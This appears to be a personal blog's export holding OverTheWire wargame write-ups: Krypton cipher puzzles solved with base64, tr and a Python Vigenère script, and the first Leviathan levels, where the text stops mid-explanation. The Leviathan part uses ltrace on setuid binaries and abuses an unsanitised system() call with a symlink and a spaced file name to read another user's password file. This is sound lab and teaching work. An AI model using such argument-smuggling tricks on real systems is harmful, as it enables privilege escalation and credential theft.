[{"content":"","date":"26 July 2025","externalUrl":null,"permalink":"/tags/binary-exploitation/","section":"Tags","summary":"","title":"Binary Exploitation","type":"tags"},{"content":"","date":"26 July 2025","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","date":"26 July 2025","externalUrl":null,"permalink":"/tags/cryptography/","section":"Tags","summary":"","title":"Cryptography","type":"tags"},{"content":"","date":"26 July 2025","externalUrl":null,"permalink":"/tags/krypton/","section":"Tags","summary":"","title":"Krypton","type":"tags"},{"content":"","date":"26 July 2025","externalUrl":null,"permalink":"/tags/leviathan/","section":"Tags","summary":"","title":"Leviathan","type":"tags"},{"content":"","date":"26 July 2025","externalUrl":null,"permalink":"/tags/linux/","section":"Tags","summary":"","title":"Linux","type":"tags"},{"content":"","date":"26 July 2025","externalUrl":null,"permalink":"/categories/overthewire/","section":"Categories","summary":"","title":"Overthewire","type":"categories"},{"content":" Krypton 0-1 # The goal of this challenges is too sharpen our skills on cryptography.\nAs for this level, we are provided with a text that is base64 encoded, upon which once decrypted, we get the password for the next level as shown below in the challenge briefing.\nWelcome to Krypton! The first level is easy. The following string encodes the password using Base64: S1JZUFRPTklTR1JFQVQ= Use this password to log in to krypton.labs.overthewire.org with username krypton1 using SSH on port 2231. You can find the files for other levels in /krypton/ For this, we shall use our Ubuntu machine to decrypt the text as shown below.\nv1c70r-n00b@v1c70r-n00b:~/Desktop/overthewire/krypton$ echo \u0026#34;S1JZUFRPTklTR1JFQVQ=\u0026#34; | base64 -d [REDACTED] With that, we have our password for the next level.\nKrypton 1-2 # The goal for this level, is to try and decrypt the encrypted password stored in the file krypton2 in order to find the password for the next level. Below is a brief of the challenge.\nThe password for level 2 is in the file ‘krypton2’. It is ‘encrypted’ using a simple rotation. It is also in non-standard ciphertext format. When using alpha characters for cipher text it is normal to group the letters into 5 letter clusters, regardless of word boundaries. This helps obfuscate any patterns. This file has kept the plain text word boundaries and carried them to the cipher text. Enjoy! Below is the text in the file that we are required to decrypt.\nkrypton1@krypton:/krypton/krypton1$ ls krypton2 README krypton1@krypton:/krypton/krypton1$ cat krypton2 YRIRY GJB CNFFJBEQ EBGGRA From the README file, the text is encrypted using rot13. Since we are encouraged to not use cryptool, we shall try a regex that can help to decrypt the text as shown below.\nkrypton1@krypton:/krypton/krypton1$ cat krypton2 | tr \u0026#39;[A-Za-z]\u0026#39; \u0026#39;[N-ZA-Mn-za-m]\u0026#39; [REDACTED] krypton1@krypton:/krypton/krypton1$ And with that, we have the password for the next level.\nKrypton 2-3 # We shall start by reading the README file to get the guidelines on how to solve the challenge for this level.\nKrypton 2 ROT13 is a simple substitution cipher. Substitution ciphers are a simple replacement algorithm. In this example of a substitution cipher, we will explore a \u0026#39;monoalphebetic\u0026#39; cipher. Monoalphebetic means, literally, \u0026#34;one alphabet\u0026#34; and you will see why. This level contains an old form of cipher called a \u0026#39;Caesar Cipher\u0026#39;. A Caesar cipher shifts the alphabet by a set number. For example: plain:\ta b c d e f g h i j k ... cipher:\tG H I J K L M N O P Q ... In this example, the letter \u0026#39;a\u0026#39; in plaintext is replaced by a \u0026#39;G\u0026#39; in the ciphertext so, for example, the plaintext \u0026#39;bad\u0026#39; becomes \u0026#39;HGJ\u0026#39; in ciphertext. The password for level 3 is in the file krypton3. It is in 5 letter group ciphertext. It is encrypted with a Caesar Cipher. Without any further information, this cipher text may be difficult to break. You do not have direct access to the key, however you do have access to a program that will encrypt anything you wish to give it using the key. If you think logically, this is completely easy. One shot can solve it! Have fun. Additional Information: The `encrypt` binary will look for the keyfile in your current working directory. Therefore, it might be best to create a working direcory in /tmp and in there a link to the keyfile. As the `encrypt` binary runs setuid `krypton3`, you also need to give `krypton3` access to your working directory. Here is an example: krypton2@melinda:~$ mktemp -d /tmp/tmp.Wf2OnCpCDQ krypton2@melinda:~$ cd /tmp/tmp.Wf2OnCpCDQ krypton2@melinda:/tmp/tmp.Wf2OnCpCDQ$ ln -s /krypton/krypton2/keyfile.dat krypton2@melinda:/tmp/tmp.Wf2OnCpCDQ$ ls keyfile.dat krypton2@melinda:/tmp/tmp.Wf2OnCpCDQ$ chmod 777 . krypton2@melinda:/tmp/tmp.Wf2OnCpCDQ$ /krypton/krypton2/encrypt /etc/issue krypton2@melinda:/tmp/tmp.Wf2OnCpCDQ$ ls ciphertext keyfile.dat From the above description, this level uses Caesar cipher. We shall do as directed in the example given by first creating a temporary directory for us to solve the challenge and create a symbolic link of the keyfile.dat on the temporary directory in order for us to understand how the cipher works then decrypt our text.\nkrypton2@krypton:/krypton/krypton2$ mkdir /tmp/news krypton2@krypton:/krypton/krypton2$ cp encrypt krypton3 /tmp/news krypton2@krypton:/krypton/krypton2$ cd /tmp/news krypton2@krypton:/tmp/news$ ln -s /krypton/krypton2/keyfile.dat krypton2@krypton:/tmp/news$ ls encrypt keyfile.dat krypton3 README As seen below, we have tried to encrypt a file using the encrypt binary,as shown below.\nkrypton2@krypton:/tmp/news$ echo \u0026#34;ABC\u0026#34;\u0026gt; me.txt krypton2@krypton:/tmp/news$ /krypton/krypton2/encrypt me.txt krypton2@krypton:/tmp/news$ ls ciphertext encrypt keyfile.dat krypton3 me.txt README krypton2@krypton:/tmp/news$ cat ciphertext MNO krypton2@krypton:/tmp/news$ From the output above, the key is 12, that is a forward shift of 12 (in simple terms the 12th alphabet from the initial letter, hence if A will be M then from B, we count to the 12th letter and that is what B will be)\nFrom the binary, it is clear the forward shift being used to encrypt text is 12. We can use a shift of ±13 to reverse our ciphertext to a readable text as shown below.\nkrypton2@krypton:/tmp/news$ cat krypton3 | tr \u0026#39;[M-ZA-Lm-za-l]\u0026#39; \u0026#39;[A-MN-Zam-n-z]\u0026#39; [redacted] The tr command\ntr stands for translate. It replaces characters from one set with characters from another.\n'[M-ZA-Lm-za-l]'\nThis set includes all letters, but rearranged in a Caesar-like shifted order:\nM-Z A-L (uppercase) m-z a-l (lowercase) This is essentially a Caesar cipher with a shift of 13, commonly known as ROT13.\n'[A-MN-Zam-n-z]'\nThis is just the standard alphabet:\nA-M N-Z (uppercase) a-m n-z (lowercase) We have our password for the next level.\nKrypton 3-4 # We shall start by reading the README file to get the instructions for this level.\nWell done. You\u0026#39;ve moved past an easy substitution cipher. Hopefully you just encrypted the alphabet a plaintext to fully expose the key in one swoop. The main weakness of a simple substitution cipher is repeated use of a simple key. In the previous exercise you were able to introduce arbitrary plaintext to expose the key. In this example, the cipher mechanism is not available to you, the attacker. However, you have been lucky. You have intercepted more than one message. The password to the next level is found in the file \u0026#39;krypton4\u0026#39;. You have also found 3 other files. (found1, found2, found3) You know the following important details: - The message plaintexts are in English (*** very important) - They were produced from the same key (*** even better!) Enjoy. Moreover, we are provided with two hints and three found files as shown below.\nkrypton3@krypton:/krypton/krypton3$ ls found1 found2 found3 HINT1 HINT2 krypton4 README krypton3@krypton:/krypton/krypton3$ Opening the two hint files, we get the following hints.\nkrypton3@krypton:/krypton/krypton3$ cat HINT* Some letters are more prevalent in English than others. \u0026#34;Frequency Analysis\u0026#34; is your friend. This is interesting, we have letters that are more prevalent than others, we can use some google fu to understand better what this means. From this link, we get to understand more about what frequency analysis is. Further search online, we come across this tool that will help us in mapping out the frequency of letters in out cipher texts. The tool did not serve us much, we can try another tool like quipquip whereby, we shall use the contents of one of the found file then put the contents of the krypton4 file at the end as shown below then click on solve to wait on the tool to give us a solution as shown below, in my case I concatenated found1 and krypton4 together, then uploaded the output to the tool for it to solve.\nkrypton3@krypton:/krypton/krypton3$ cat found1 krypton4 CGZNL YJBEN QYDLQ ZQSUQ NZCYD SNQVU BFGBK GQUQZ QSUQN UZCYD SNJDS UDCXJ ZCYDS NZQSU QNUZB WSBNZ QSUQN UDCXJ CUBGS BXJDS UCTYV SUJQG WTBUJ KCWSV LFGBK GSGZN LYJCB GJSZD GCHMS UCJCU QJLYS BXUMA UJCJM JCBGZ CYDSN CGKDC ZDSQZ DVSJJ SNCGJ DSYVQ CGJSO JCUNS YVQZS WALQV SJJSN UBTSX COSWG MTASN BXYBU CJCBG UWBKG JDSQV YDQAS JXBNS OQTYV SKCJD QUDCX JBXQK BMVWA SNSYV QZSWA LWAKB MVWAS ZBTSS QGWUB BGJDS TSJDB WCUGQ TSWQX JSNRM VCMUZ QSUQN KDBMU SWCJJ BZBTT MGCZQ JSKCJ DDCUE SGSNQ VUJDS SGZNL YJCBG UJSYY SNXBN TSWAL QZQSU QNZCY DSNCU BXJSG CGZBN YBNQJ SWQUY QNJBX TBNSZ BTYVS OUZDS TSUUM ZDQUJ DSICE SGNSZ CYDSN QGWUJ CVVDQ UTBWS NGQYY VCZQJ CBGCG JDSNB JULUJ STQUK CJDQV VUCGE VSQVY DQASJ UMAUJ CJMJC BGZCY DSNUJ DSZQS UQNZC YDSNC USQUC VLANB FSGQG WCGYN QZJCZ SBXXS NUSUU SGJCQ VVLGB ZBTTM GCZQJ CBGUS ZMNCJ LUDQF SUYSQ NSYNB WMZSW TBUJB XDCUF GBKGK BNFAS JKSSG QGWDC USQNV LYVQL UKSNS TQCGV LZBTS WCSUQ GWDCU JBNCS UESGN SUDSN QCUSW JBJDS YSQFB XUBYD CUJCZ QJCBG QGWQN JCUJN LALJD SSGWB XJDSU COJSS GJDZS GJMNL GSOJD SKNBJ STQCG VLJNQ ESWCS UMGJC VQABM JCGZV MWCGE DQTVS JFCGE VSQNQ GWTQZ ASJDZ BGUCW SNSWU BTSBX JDSXC GSUJS OQTYV SUCGJ DSSGE VCUDV QGEMQ ESCGD CUVQU JYDQU SDSKN BJSJN QECZB TSWCS UQVUB FGBKG QUNBT QGZSU QGWZB VVQAB NQJSW KCJDB JDSNY VQLKN CEDJU TQGLB XDCUY VQLUK SNSYM AVCUD SWCGS WCJCB GUBXI QNLCG EHMQV CJLQG WQZZM NQZLW MNCGE DCUVC XSJCT SQGWC GJKBB XDCUX BNTSN JDSQJ NCZQV ZBVVS QEMSU YMAVC UDSWJ DSXCN UJXBV CBQZB VVSZJ SWSWC JCBGB XDCUW NQTQJ CZKBN FUJDQ JCGZV MWSWQ VVAMJ JKBBX JDSYV QLUGB KNSZB EGCUS WQUUD QFSUY SQNSU KSVVW BGSJD SVSIS VXBMN YQUUK BNWCU ANMJS With that, we now have the password for the next level.\nKrypton 4-5 # Just like the other challenges, we shall start by first reading the README file to see what is required of us.\nGood job! You more than likely used frequency analysis and some common sense to solve that one. So far we have worked with simple substitution ciphers. They have also been \u0026#39;monoalphabetic\u0026#39;, meaning using a fixed key, and giving a one to one mapping of plaintext (P) to ciphertext (C). Another type of substitution cipher is referred to as \u0026#39;polyalphabetic\u0026#39;, where one character of P may map to many, or all, possible ciphertext characters. An example of a polyalphabetic cipher is called a Vigen�re Cipher. It works like this: If we use the key(K) \u0026#39;GOLD\u0026#39;, and P = PROCEED MEETING AS AGREED, then \u0026#34;add\u0026#34; P to K, we get C. When adding, if we exceed 25, then we roll to 0 (modulo 26). P P R O C E E D M E E T I N G A S A G R E E D K G O L D G O L D G O L D G O L D G O L D G O becomes: P 15 17 14 2 4 4 3 12 4 4 19 8 13 6 0 18 0 6 17 4 4 3 K 6 14 11 3 6 14 11 3 6 14 11 3 6 14 11 3 6 14 11 3 6 14 C 21 5 25 5 10 18 14 15 10 18 4 11 19 20 11 21 6 20 2 8 10 17 So, we get a ciphertext of: VFZFK SOPKS ELTUL VGUCH KR This level is a Vigen�re Cipher. You have intercepted two longer, english language messages. You also have a key piece of information. You know the key length! For this exercise, the key length is 6. The password to level five is in the usual place, encrypted with the 6 letter key. Have fun! As stated in the README file, we are using the vigenere cipher, one of the poly-alphabetic ciphers. Moreover, from the description, the key length we are told is 6.\nFor this case, we shall use online tools to get the key from the found file texts then use the key to decrypt the message on the file krypton5. The tool we shall use is this one.\nFrom the screenshot above, we have found the key to use to decrypt the password for the next level, we shall open a new tab and input the found key to decrypt the cipher text as shown below.\nKrypton 5-6 # We start by reading the readme file as usual to get an understanding of the cipher or encryption algorithm we are about to deal with.\nFrequency analysis can break a known key length as well. Lets try one last polyalphabetic cipher, but this time the key length is unknown. Enjoy. From the description, we need to perform some sort of brute force to get the key length we can use. We shall use the same tool as the one we used in level 4\nAs seen above, we have been able to get the key by using the cipher text from found1 file and the key-length as well. We can use this key to decrypt the cipher text for password for level 6 as shown below.\nKrypton 6-7 # From the README file, we get the following information.\nHopefully by now its obvious that encryption using repeating keys is a bad idea. Frequency analysis can destroy repeating/fixed key substitution crypto. A feature of good crypto is random ciphertext. A good cipher must not reveal any clues about the plaintext. Since natural language plaintext (in this case, English) contains patterns, it is left up to the encryption key or the encryption algorithm to add the \u0026#39;randomness\u0026#39;. Modern ciphers are similar to older plain substitution ciphers, but improve the \u0026#39;random\u0026#39; nature of the key. An example of an older cipher using a complex, random, large key is a vigniere using a key of the same size of the plaintext. For example, imagine you and your confident have agreed on a key using the book \u0026#39;A Tale of Two Cities\u0026#39; as your key, in 256 byte blocks. The cipher works as such: Each plaintext message is broken into 256 byte blocks. For each block of plaintext, a corresponding 256 byte block from the book is used as the key, starting from the first chapter, and progressing. No part of the book is ever re-used as key. The use of a key of the same length as the plaintext, and only using it once is called a \u0026#34;One Time Pad\u0026#34;. Look in the krypton6/onetime directory. You will find a file called \u0026#39;plain1\u0026#39;, a 256 byte block. You will also see a file \u0026#39;key1\u0026#39;, the first 256 bytes of \u0026#39;A Tale of Two Cities\u0026#39;. The file \u0026#39;cipher1\u0026#39; is the cipher text of plain1. As you can see (and try) it is very difficult to break the cipher without the key knowledge. (NOTE - it is possible though. Using plain language as a one time pad key has a weakness. As a secondary challenge, open README in that directory) If the encryption is truly random letters, and only used once, then it is impossible to break. A truly random \u0026#34;One Time Pad\u0026#34; key cannot be broken. Consider intercepting a ciphertext message of 1000 bytes. One could brute force for the key, but due to the random key nature, you would produce every single valid 1000 letter plaintext as well. Who is to know which is the real plaintext?!? Choosing keys that are the same size as the plaintext is impractical. Therefore, other methods must be used to obscure ciphertext against frequency analysis in a simple substitution cipher. The impracticality of an \u0026#39;infinite\u0026#39; key means that the randomness, or entropy, of the encryption is introduced via the method. We have seen the method of \u0026#39;substitution\u0026#39;. Even in modern crypto, substitution is a valid technique. Another technique is \u0026#39;transposition\u0026#39;, or swapping of bytes. Modern ciphers break into two types; symmetric and asymmetric. Symmetric ciphers come in two flavours: block and stream. Until now, we have been playing with classical ciphers, approximating \u0026#39;block\u0026#39; ciphers. A block cipher is done in fixed size blocks (suprise!). For example, in the previous paragraphs we discussed breaking text and keys into 256 byte blocks, and working on those blocks. Block ciphers use a fixed key to perform substituion and transposition ciphers on each block discretely. Its time to employ a stream cipher. A stream cipher attempts to create an on-the-fly \u0026#39;random\u0026#39; keystream to encrypt the incoming plaintext one byte at a time. Typically, the \u0026#39;random\u0026#39; key byte is xor\u0026#39;d with the plaintext to produce the ciphertext. If the random keystream can be replicated at the recieving end, then a further xor will produce the plaintext once again. From this example forward, we will be working with bytes, not ASCII text, so a hex editor/dumper like hexdump is a necessity. Now is the right time to start to learn to use tools like cryptool. In this example, the keyfile is in your directory, however it is not readable by you. The binary \u0026#39;encrypt6\u0026#39; is also available. It will read the keyfile and encrypt any message you desire, using the key AND a \u0026#39;random\u0026#39; number. You get to perform a \u0026#39;known ciphertext\u0026#39; attack by introducing plaintext of your choice. The challenge here is not simple, but the \u0026#39;random\u0026#39; number generator is weak. As stated, it is now that we suggest you begin to use public tools, like cryptool, to help in your analysis. You will most likely need a hint to get going. See \u0026#39;HINT1\u0026#39; if you need a kicktstart. If you have further difficulty, there is a hint in \u0026#39;HINT2\u0026#39;. The password for level 7 (krypton7) is encrypted with \u0026#39;encrypt6\u0026#39;. Good Luck! We have now moved from classical ciphers to modern ciphers of symmetric and asymmetric ciphers but for this challenge, we are focusing mostly on the stream cipher symmetric, a flavor of symmetric cipher.\nLooking at the hints given.\nThe \u0026#39;random\u0026#39; generator has a limited number of bits, and is periodic. Entropy analysis and a good look at the bytes in a hex editor will help. There is a pattern! 8 bit LFSR Just like level 2, we shall start first by creating a new temporary folder for our exploration, then copy the krypton file to the temporary folder and create a symbolic link o the keyfile to our temporary directory.\nrypton6@krypton:/krypton/krypton6$ mkdir /tmp/newz krypton6@krypton:/krypton/krypton6$ cp krypton7 /tmp/newz krypton6@krypton:/krypton/krypton6$ cd /tmp/newz krypton6@krypton:/tmp/newz$ ln -s /krypton/krypton6/keyfile.dat Next I tried to print 50 As using python then encrypt using the binary provided to us and noticed a recurring pattern, where after 30 characters, the pattern starts repeating again as shown below.\nkrypton6@krypton:/tmp/newz$ python3 -c \u0026#34;print( \u0026#39;A\u0026#39;*50)\u0026#34; \u0026gt; test.txt krypton6@krypton:/tmp/newz$ /krypton/krypton6/encrypt6 test.txt output.txt krypton6@krypton:/tmp/newz$ cat output.txt EICTDGYIYZKTHNSIRFXYCPFUEOCKRNEICTDGYIYZKTHNSIRFXY As seen above, after 30 characters, the pattern starts to repeat EICTDGYIYZKTHNSIRFXYCPFUEOCKRN EICTDGYIYZKTHNSIRFXY\nWe can now try a python script that will fasten the process and be able to get the password for the next level.\nkey = \u0026#39;EICTDGYIYZKTHNSIRFXYCPFUEOCKRN\u0026#39; cipher = \u0026#39;PNUKLYLWRQKGKBE\u0026#39; pt = \u0026#39;\u0026#39; for i in range(len(cipher)): tmp = ord(cipher[i]) - ord(key[i]) if tmp \u0026lt; 0: tmp += 26 tmp += ord(\u0026#39;A\u0026#39;) pt += chr(tmp) print (pt) Below is a breakdown of the code\n🟦 key and cipher:\nkey is a 30-character uppercase string (but only the first 15 are used). cipher is a 15-character encrypted message. 🟦 pt = '':\nThis initializes the plaintext result. 🔄 The for loop:\nfor i in range(len(cipher)): Iterates over each character of the cipher (15 characters in total). 🔤 Decryption Logic:\ntmp = ord(cipher[i]) - ord(key[i]) Converts both the cipher character and the corresponding key character to their ASCII values. Subtracts the key letter from the cipher letter. This is how the Vigenère decryption works:\nP (cipher) - E (key) = K (plain) 📉 if tmp \u0026lt; 0: tmp += 26\nIf the result is negative (e.g., \u0026lsquo;A\u0026rsquo; - \u0026lsquo;Z\u0026rsquo;), wrap around the alphabet by adding 26. 🔁 tmp += ord('A')\nShifts the result back into the uppercase letter range (ASCII 65–90). 🔠 pt += chr(tmp)\nConverts the result back to a character and appends it to the plaintext. 📤 Final Output:\nPrints the decrypted message.\n🧪 Example Run:\nIf you run the code, you\u0026rsquo;ll get the output:\nKNOWLEDGEISPOWER After executing the script we get the password as seen below.\nkrypton6@krypton:/tmp/newz$ python3 a.py [REDACTED] Krypton 7 # We have now aided superman overcome his weakness.\nkrypton7@krypton:/krypton/krypton7$ ls README krypton7@krypton:/krypton/krypton7$ cat README Congratulations on beating Krypton! krypton7@krypton:/krypton/krypton7$ TILL we meet again 😊.\n","date":"26 July 2025","externalUrl":null,"permalink":"/posts/krypton/","section":"Posts","summary":"overthewire wargames krypton series","title":"overthewire krypton war games","type":"posts"},{"content":" Leviathan 0-1 # As described on the page, this challenges do not require programming skills and the difficulty level is 1/10.\nSummary: Difficulty: 1/10 Levels: 8 Platform: Linux/x86 Author: Anders Tonfeldt Special Thanks: We would like to thank AstroMonk for coming up with a replacement idea for the last level, deadfood for finding a leveljump and Coi for finding a non-planned vulnerability. Description: This wargame doesn\u0026#39;t require any knowledge about programming - just a bit of common sense and some knowledge about basic *nix commands. We had no idea that it\u0026#39;d be this hard to make an interesting wargame that wouldn\u0026#39;t require programming abilities from the players. Hopefully we made an interesting challenge for the new ones. Leviathan’s levels are called leviathan0, leviathan1, … etc. and can be accessed on leviathan.labs.overthewire.org through SSH on port 2223. To login to the first level use: Username: leviathan0 Password: leviathan0 Data for the levels can be found in the homedirectories. You can look at /etc/leviathan_pass for the various level passwords. With that, we can log in to our first level and look for what is of interest to us in the home directory.\nleviathan0@leviathan:~$ ls -a . .. .backup .bash_logout .bashrc .profile leviathan0@leviathan:~$ As seen above we have a folder named .backup we can look into it and see what is contained in there.\nleviathan0@leviathan:~$ cd .backup/ leviathan0@leviathan:~/.backup$ ls bookmarks.html We have an html file called bookmarks.html we shall go through it and see if we will find the password for the next level using grep as shown below..\nleviathan0@leviathan:~/.backup$ grep \u0026#34;leviathan1\u0026#34; bookmarks.html \u0026lt;DT\u0026gt;\u0026lt;A HREF=\u0026#34;http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is [REDACTED]\u0026#34; ADD_DATE=\u0026#34;1155384634\u0026#34; LAST_CHARSET=\u0026#34;ISO-8859-1\u0026#34; ID=\u0026#34;rdf:#$2wIU71\u0026#34;\u0026gt;password to leviathan1\u0026lt;/A\u0026gt; leviathan0@leviathan:~/.backup$ We now have the password for leviathan1.\nLeviathan 1-2 # For this level, we have a binary, check, that we need to look into closely as seen below.\nleviathan1@leviathan:~$ ls -la total 36 drwxr-xr-x 2 root root 4096 Jul 28 19:05 . drwxr-xr-x 150 root root 4096 Jul 28 19:06 .. -rw-r--r-- 1 root root 220 Mar 31 2024 .bash_logout -rw-r--r-- 1 root root 3851 Jul 28 18:47 .bashrc -r-sr-x--- 1 leviathan2 leviathan1 15084 Jul 28 19:05 check -rw-r--r-- 1 root root 807 Mar 31 2024 .profile leviathan1@leviathan:~$ When we try to execute it, we are required to provide a password to execute the file as shown below.\nleviathan1@leviathan:~$ ./check password: When we input the wrong password, we get the following output.\nleviathan1@leviathan:~$ ./check password: 124242 Wrong password, Good Bye ... leviathan1@leviathan:~$ We can check the library calls when we execute the binary using the command ltrace as sown below.\nleviathan1@leviathan:~$ ltrace ./check __libc_start_main(0x80490ed, 1, 0xffffd424, 0 \u0026lt;unfinished ...\u0026gt; printf(\u0026#34;password: \u0026#34;) = 10 getchar(0, 0, 0x786573, 0x646f67password: 123141ds ) = 49 getchar(0, 49, 0x786573, 0x646f67) = 50 getchar(0, 0x3231, 0x786573, 0x646f67) = 51 strcmp(\u0026#34;123\u0026#34;, \u0026#34;sex\u0026#34;) = -1 puts(\u0026#34;Wrong password, Good Bye ...\u0026#34;Wrong password, Good Bye ... ) = 29 +++ exited (status 0) +++ From above, the binary is using the strcmp, a C library function that compares two strings against one another. From the calls, the binary is comparing the password provided by the user to the word sex. We can now try to use the password sex and see if we can get a shell.\nleviathan1@leviathan:~$ ./check password: sex $ whoami leviathan2 $ With the password sex, we now have a shell. Just like bandit, we can get the password for the next level at /etc/leviathan_pass/\u0026lt;leviathan(level)\u0026gt;\n$ cat /etc/leviathan_pass/leviathan2 [REDACTED] $ Leviathan 2-3 # Just like the previous level, this challenge has a binary too that we need to look into printfile, as shown below.\nleviathan2@leviathan:~$ ls -la total 36 drwxr-xr-x 2 root root 4096 Jul 28 19:05 . drwxr-xr-x 150 root root 4096 Jul 28 19:06 .. -rw-r--r-- 1 root root 220 Mar 31 2024 .bash_logout -rw-r--r-- 1 root root 3851 Jul 28 18:47 .bashrc -r-sr-x--- 1 leviathan3 leviathan2 15072 Jul 28 19:05 printfile -rw-r--r-- 1 root root 807 Mar 31 2024 .profile leviathan2@leviathan:~$ WE can try and execute it to see how it behaves.\nleviathan2@leviathan:~$ ./printfile *** File Printer *** Usage: ./printfile filename leviathan2@leviathan:~$ Form the above output, it seems we are required to pass a file for the binary to execute. We can try and open the password file and see f we can get the password for the next level using the binary.\nleviathan2@leviathan:~$ ./printfile /etc/leviathan_pass/leviathan3 You cant have that file... leviathan2@leviathan:~$ We can not open the file using the binary. We can create a temporary directory where we can explore the binary further.\nleviathan2@leviathan:/tmp/new$ ls printfile test.txt leviathan2@leviathan:/tmp/new$ From above, we can use the binary to open the test file we have created and look at the library calls being made by the binary using ltrace.\nleviathan2@leviathan:/tmp/new$ ltrace ./printfile test.txt __libc_start_main(0x80490ed, 2, 0xffffd3f4, 0 \u0026lt;unfinished ...\u0026gt; access(\u0026#34;test.txt\u0026#34;, 4) = 0 snprintf(\u0026#34;/bin/cat test.txt\u0026#34;, 511, \u0026#34;/bin/cat %s\u0026#34;, \u0026#34;test.txt\u0026#34;) = 17 geteuid() = 12002 geteuid() = 12002 setreuid(12002, 12002) = 0 system(\u0026#34;/bin/cat test.txt\u0026#34; \u0026lt;no return ...\u0026gt; --- SIGCHLD (Child exited) --- \u0026lt;... system resumed\u0026gt; ) = 0 +++ exited (status 0) +++ leviathan2@leviathan:/tmp/new$ ltrace ./printfile test.txt\nYou\u0026rsquo;re using ltrace to trace library calls made by the printfile program.\n__libc_start_main(0x80490ed, 2, 0xffffd3f4, 0 \u0026lt;unfinished ...\u0026gt;\nThis is the standard entry point into a C program — it calls main().\naccess(\u0026quot;test.txt\u0026quot;, 4) = 0\nThis checks whether the file test.txt is readable (mode 4 = read permission). The return value 0 means the file is accessible.\nsnprintf(\u0026quot;/bin/cat test.txt\u0026quot;, 511, \u0026quot;/bin/cat %s\u0026quot;, \u0026quot;test.txt\u0026quot;) = 17\nThe program is constructing a shell command string that ends up as:\n/bin/cat test.txt It\u0026rsquo;s preparing to run this.\ngeteuid() = 12002\ngeteuid() = 12002\nIt checks the effective user ID (EUID) twice — value 12002. This likely corresponds to the user running the binary or the binary\u0026rsquo;s setuid owner.\nsetreuid(12002, 12002) = 0\nIt sets both the real and effective user ID to 12002. This is usually done to drop privileges or to ensure the binary runs as a specific user (possibly its setuid owner).\nsystem(\u0026quot;/bin/cat test.txt\u0026quot; \u0026lt;no return ...\u0026gt;\nThis line shows the program is now running:\n/bin/cat test.txt via the system() call, which invokes a shell to execute the command.\n-- SIGCHLD (Child exited) ---\nThis signal is received when the child process (i.e., /bin/cat) exits.\n\u0026lt;... system resumed\u0026gt; ) = 0\nThe system() call completes successfully (return value 0), meaning the command executed without error.\n+++ exited (status 0) +++\nThe printfile program exits normally with exit code 0.\nFrom the binary, we have a small security hole that is, using system() with user-supplied input (test.txt) and not sanitizing it is dangerous, it makes the binary vulnerable to command injection.\nIn short, the real user ID (RUID) represents the actual user who owns the process, essentially your true identity. The effective user ID (EUID), on the other hand, is what the operating system uses to decide whether you have permission to perform certain actions — it\u0026rsquo;s the ID that determines your access rights in most cases (though there are some exceptions).\nWith that we can try to have a file with spaces and see how the binary will execute it.\nleviathan2@leviathan:/tmp/new$ touch pass\\ file.txt leviathan2@leviathan:/tmp/new$ ./printfile \u0026#34;pass file.txt\u0026#34; /bin/cat: pass: No such file or directory /bin/cat: file.txt: No such file or directory leviathan2@leviathan:/tmp/new$ ltrace ./printfile \u0026#34;pass file.txt\u0026#34; __libc_start_main(0x80490ed, 2, 0xffffd3f4, 0 \u0026lt;unfinished ...\u0026gt; access(\u0026#34;pass file.txt\u0026#34;, 4) = 0 snprintf(\u0026#34;/bin/cat pass file.txt\u0026#34;, 511, \u0026#34;/bin/cat %s\u0026#34;, \u0026#34;pass file.txt\u0026#34;) = 22 geteuid() = 12002 geteuid() = 12002 setreuid(12002, 12002) = 0 system(\u0026#34;/bin/cat pass file.txt\u0026#34;/bin/cat: pass: No such file or directory /bin/cat: file.txt: No such file or directory \u0026lt;no return ...\u0026gt; --- SIGCHLD (Child exited) --- \u0026lt;... system resumed\u0026gt; ) = 256 +++ exited (status 0) +++ leviathan2@leviathan:/tmp/new$ As seen above, the binary is reading the file as two separate files. We can create a symbolic link for the pass part of the file and link it to /etc/leviathan_pass/leviathan3 in order to get the password for the next level when the binary tries to open the file as shown below.\nleviathan2@leviathan:/tmp/new$ ln -s /etc/leviathan_pass/leviathan3 /tmp/new/pass leviathan2@leviathan:/tmp/new$ ls -la total 40 drwxrwxr-x 2 leviathan2 leviathan2 4096 Jul 29 07:15 . drwxrwx-wt 455 root root 20480 Jul 29 07:15 .. lrwxrwxrwx 1 leviathan2 leviathan2 30 Jul 29 07:15 pass -\u0026gt; /etc/leviathan_pass/leviathan3 -rw-rw-r-- 1 leviathan2 leviathan2 0 Jul 29 07:10 pass file.txt -r-xr-x--- 1 leviathan2 leviathan2 15072 Jul 29 06:48 printfile leviathan2@leviathan:/tmp/new$ ln -s /etc/leviathan_pass/leviathan3 /tmp/new/pass Below is a breakdown of the command above.\nln: the link command, used to create links between files. s: creates a symbolic (soft) link, not a hard link. /etc/leviathan_pass/leviathan3: the target file — it contains the password for the user leviathan3. /tmp/new/pass: the name of the new symlink that will point to the target. With that, we now have the password for the next level.\nleviathan2@leviathan:/tmp/new$ ~/printfile \u0026#34;pass.txt file.txt\u0026#34; /bin/cat: pass.txt: No such file or directory [REDACTED] leviathan2@leviathan:/tmp/new$ Leviathan 3-4 # This challenge is similar to level 2 and 3, we have another binary to look into called level3. We shall start by executing it to see how it behaves.\nleviathan3@leviathan:~$ ./level3 Enter the password\u0026gt; eowevmweg bzzzzzzzzap. WRONG leviathan3@leviathan:~$ We are required to input a password, for that we shall look at the library calls to see what libraries are being called.\nleviathan3@leviathan:~$ ltrace ./level3 __libc_start_main(0x80490ed, 1, 0xffffd424, 0 \u0026lt;unfinished ...\u0026gt; strcmp(\u0026#34;h0no33\u0026#34;, \u0026#34;kakaka\u0026#34;) = -1 printf(\u0026#34;Enter the password\u0026gt; \u0026#34;) = 20 fgets(Enter the password\u0026gt; mnnnwenw \u0026#34;mnnnwenw\\n\u0026#34;, 256, 0xf7fab5c0) = 0xffffd1fc strcmp(\u0026#34;mnnnwenw\\n\u0026#34;, \u0026#34;snlprintf\\n\u0026#34;) = -1 puts(\u0026#34;bzzzzzzzzap. WRONG\u0026#34;bzzzzzzzzap. WRONG ) = 19 +++ exited (status 0) +++ __libc_start_main(0x80490ed, 1, 0xffffd424, 0 \u0026lt;unfinished ...\u0026gt;)\nThis is where execution begins. It\u0026rsquo;s calling the program\u0026rsquo;s main() function.\nstrcmp(\u0026quot;h0no33\u0026quot;, \u0026quot;kakaka\u0026quot;) = -1\nThis is likely a decoy or debug comparison that the program performs before asking for the actual password.\nIt compares 